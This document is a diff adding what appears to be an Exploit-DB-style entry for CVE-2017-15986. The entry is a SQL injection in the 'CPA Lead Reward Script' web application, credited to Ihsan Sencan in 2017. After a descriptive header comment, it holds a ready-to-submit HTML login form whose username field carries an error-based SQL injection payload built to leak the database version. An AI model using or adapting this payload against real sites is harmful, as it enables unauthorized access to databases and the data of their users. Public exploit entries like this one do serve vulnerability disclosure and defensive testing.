@@ -1,0 +1,29 @@
+<!--
+# # # # # 
+# Exploit Title: CPA Lead Reward Script - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.websitescripts.org/
+# Software Link: http://www.websitescripts.org/website-scripts/cpa-lead-reward-script-incentive-script-/prod_68.html
+# Demo: http://www.websitescripts.org/demo/cpaleadrewardscript/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15986
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# # # # #
+-->
+<form action="http://localhost/[PATH]/index.php" method="post">
+<input type="text" name="username" value="' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x494853414e2053454e43414e202d ,(SELECT (ELT(4=4,1))),VERSiON(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'efe'='"/>
+<input name="password" type="password" value="eFe"/>
+<input type="Submit" name="login" value="Ver Ayari" />
+</form>
